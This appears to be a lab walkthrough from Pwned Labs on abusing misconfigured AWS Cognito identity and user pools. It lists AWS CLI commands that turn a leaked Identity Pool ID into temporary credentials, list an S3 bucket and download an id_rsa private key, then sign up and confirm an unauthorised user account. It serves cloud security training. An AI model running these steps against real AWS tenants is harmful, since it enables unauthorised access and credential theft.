https://pwnedlabs.io/labs/abuse-cognito-user-and-identity-pools

Source code leaks a Cognito Identity Pool ID with a reference to an S3 bucket named `hl-app-images`. We can try to request a unique Identity ID by providing the Identity Pool ID from the source code:

```bash
aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign
	IdentityId
```

Now with this ID, we can request credentials for it and authenticate:

```bash
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
	Access Key
	Secret Key
	Session Token
aws configure --profile cognito
aws sts get-caller-identity
```

Enumerate the S3 bucket:

```bash
aws s3 ls hl-app-images --profile cognito
	temp/
aws s3 ls hl-app-images/temp/ --profile cognito
	id_rsa
aws s3 cp s3://hl-app-images/temp/id_rsa . --profile cognito
```

With the SSH key, we can enumerate further in the EC2 instances or other hosts.

---

A publicly exposed Cognito-hosted UI for a web app was also discovered. It is associated with a Cognito User Pool. With the client id (found in the URL that was exposed), we can enumerate users that already exist:

```bash
aws cognito-idp sign-up --client-id <id> --username test --password 'Password123!'
	UserConfirmed false
aws cognito-idp initiate-auth --client-id <id> --auth-flow USER_PASSWORD_AUTH --auth-parameters USERNAME=test,PASSWORD=Password123!
	UserNotConfirmedException
```

In case `Allow Cognito to automatically send messages to verify and confirm` is configured (`UserNotConfirmedException`), we can send a verification code:

```bash
aws cognito-idp sign-up --client-id <id> --username test_user --password <password> --user-attributes Name="email",Value="<email>" Name="name",Value="Test"
	json stating email delivery
```

The below command can provide the code and confirm our account, no output is returned:

```bash
aws cognito-idp confirm-sign-up --client-id <id> --username test_user --confirmation-code <Email_Code>
```